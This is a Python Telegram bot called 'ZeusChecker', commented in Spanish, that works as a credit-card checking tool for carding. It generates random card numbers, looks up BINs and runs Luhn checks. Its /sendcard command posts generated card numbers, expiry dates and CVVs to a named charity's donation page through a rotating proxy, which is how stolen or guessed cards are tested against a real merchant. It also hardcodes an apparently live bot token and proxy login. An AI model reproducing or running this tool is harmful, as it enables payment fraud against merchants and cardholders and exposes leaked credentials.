import logging
import random
import string
import requests
from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext

# Configuración del registro de logs
logging.basicConfig(level=logging.INFO)

# Token del bot proporcionado por BotFather
TOKEN = '6436837053:AAH_kF4pr9RcQftEfKOcg6MWtniIIdSTy54'

# Configuración del proxy
proxies = {
    'http': 'http://qnuomzzl-rotate:4i44gnayqk7c@p.webshare.io:80/',
    'https': 'http://qnuomzzl-rotate:4i44gnayqk7c@p.webshare.io:80/'
}

session = requests.Session()

# Función para generar datos de usuario aleatorios
def generate_random_user():
    letters = string.ascii_lowercase
    first = ''.join(random.choice(letters) for _ in range(6))
    last = ''.join(random.choice(letters) for _ in range(6))
    email = f'{first}.{last}@gmail.com'
    pwd = ''.join(random.choice(letters) for _ in range(10))
    name = f'{first} {last}'
    return name, email, pwd

# Función para generar datos de tarjeta de crédito aleatorios
def generate_random_card():
    card_number = ''.join(str(random.randint(0, 9)) for _ in range(16))
    exp_month = str(random.randint(1, 12)).zfill(2)
    exp_year = str(random.randint(22, 30))
    exp_date = f"{exp_month}/{exp_year}"
    cvv = ''.join(str(random.randint(0, 9)) for _ in range(3))
    return card_number, exp_date, cvv

# Función para realizar solicitudes GET
def perform_get_request(url, params=None):
    response = session.get(url, params=params, proxies=proxies)
    return response

# Función para realizar solicitudes POST
def perform_post_request(url, data):
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    response = session.post(url, data=data, headers=headers, proxies=proxies)
    return response

# Manejo de comandos del bot
def start(update: Update, context: CallbackContext):
    context.bot.send_message(chat_id=update.effective_chat.id, text='Hola, soy tu bot ZeusChecker.')

def echo(update: Update, context: CallbackContext):
    context.bot.send_message(chat_id=update.effective_chat.id, text=update.message.text)

def generate_card_info(update: Update, context: CallbackContext):
    card_number, exp_date, cvv = generate_random_card()
    message = (f"Aquí está la información de la tarjeta de crédito generada:\n\n"
               f"Número de tarjeta: {card_number}\n"
               f"Fecha de vencimiento: {exp_date}\n"
               f"CVV: {cvv}")
    context.bot.send_message(chat_id=update.effective_chat.id, text=message)

def check_bin(update: Update, context: CallbackContext):
    bin_number = context.args[0] if context.args else ''
    if not bin_number:
        context.bot.send_message(chat_id=update.effective_chat.id, text="Por favor, proporciona un BIN.")
        return
    
    response = perform_get_request(f"https://lookup.binlist.net/{bin_number}")
    if response.status_code == 200:
        data = response.json()
        bank = data.get('bank', {}).get('name', 'Desconocido')
        country = data.get('country', {}).get('name', 'Desconocido')
        card_type = data.get('type', 'Desconocido')
        message = (f"Información del BIN {bin_number}:\n\n"
                   f"Banco: {bank}\n"
                   f"País: {country}\n"
                   f"Tipo de Tarjeta: {card_type}")
    else:
        message = "No se pudo obtener información para este BIN."
    
    context.bot.send_message(chat_id=update.effective_chat.id, text=message)

def cc_check(update: Update, context: CallbackContext):
    card_number = context.args[0] if context.args else ''
    if not card_number:
        message = "Por favor, proporciona un número de tarjeta para verificar."
    elif cc_check_valid(card_number):
        message = f"El número de tarjeta {card_number} es válido."
    else:
        message = f"El número de tarjeta {card_number} no es válido."

    context.bot.send_message(chat_id=update.effective_chat.id, text=message)

def cc_check_valid(card_number):
    card_number = card_number.replace(" ", "")
    total = 0
    is_second_digit = False
    
    for digit in reversed(card_number):
        digit = int(digit)
        if is_second_digit:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
        is_second_digit = not is_second_digit
    
    return total % 10 == 0

def send_card_data(update: Update, context: CallbackContext):
    card_number, exp_date, cvv = generate_random_card()
    
    url = "https://animalsaustralia.org/take-action/donate/"  # URL proporcionada
    data = {
        'card_number': card_number,
        'exp_date': exp_date,
        'cvv': cvv,
        'amount': '10.00'  # Ajusta el monto según sea necesario
    }
    
    response = perform_post_request(url, data)
    
    if response.status_code == 200:
        message = f"Los datos de la tarjeta se han enviado correctamente.\nRespuesta: {response.text}"
    else:
        message = (f"Error al enviar los datos de la tarjeta.\n"
                   f"Código de estado: {response.status_code}\nRespuesta: {response.text}")
    
    context.bot.send_message(chat_id=update.effective_chat.id, text=message)

# Función principal
def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler('start', start))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, echo))
    dp.add_handler(CommandHandler('gen', generate_card_info))
    dp.add_handler(CommandHandler('chkbin', check_bin))
    dp.add_handler(CommandHandler('chk', cc_check))
    dp.add_handler(CommandHandler('sendcard', send_card_data))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()